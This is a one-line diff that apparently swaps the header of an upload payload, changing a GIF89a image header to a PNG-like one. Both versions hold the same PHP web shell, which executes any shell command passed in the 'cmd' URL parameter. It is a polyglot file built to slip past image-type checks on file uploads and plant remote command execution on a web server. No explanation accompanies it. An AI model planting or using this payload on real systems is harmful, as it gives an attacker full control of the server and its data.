@@ -1,1 +1,1 @@
-GIF89a;<?php system($_GET['cmd']);?>
+.PNG....;<?php system($_GET['cmd']);?>
